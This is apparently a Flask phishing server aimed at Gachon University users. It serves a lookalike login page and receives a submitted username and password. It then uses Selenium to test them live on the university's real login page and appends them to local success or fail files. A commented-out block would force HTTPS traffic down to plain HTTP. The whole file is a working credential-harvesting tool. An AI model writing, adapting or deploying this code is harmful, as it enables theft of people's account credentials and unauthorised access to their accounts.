from flask import Flask, render_template, request, jsonify, redirect
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

app = Flask(__name__)

#@app.before_request
#def before_request():
#if request.scheme == 'https':
#return redirect(request.url.replace('https://', 'http://', 1), code=301)
@app.route('/')
def home():
    return render_template('index.html')
@app.route('/naver')
def redirect():
    return render_template("gachon.html")
@app.route('/login', methods=['POST'])
def login():
    print(f'login1')
    data = request.json
    id_ = data.get('id')
    password = data.get('password')
    print(f'login2')
    chrome_options = Options()
    driver = webdriver.Chrome(options=chrome_options)
    chrome_options.add_experimental_option("detach", True)
    driver.implicitly_wait(1)
    driver.get(url='https://cyber.gachon.ac.kr/login.php')
    driver.find_element(By.XPATH,'//*[@id="username"]').send_keys(id_)
    driver.find_element(By.XPATH,'//*[@id="password"]').send_keys(password)
    driver.find_element(By.XPATH,'//*[@id="password"]').send_keys(Keys.ENTER)
    try:
        driver.find_element(By.XPATH,'//*[@id="password"]')
        message = 'fail'
        with open("fail.txt", "a", encoding='utf-8') as f:
            f.write(id_ + '\n' + password + '\n')
    except:
        message = 'success'
        with open("success.txt", "a", encoding='utf-8') as f:
            f.write(id_ + '\n' + 'password1' + '\n')
            #return render_template("gachon.html")
    driver.quit()
    return jsonify({'message':message})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
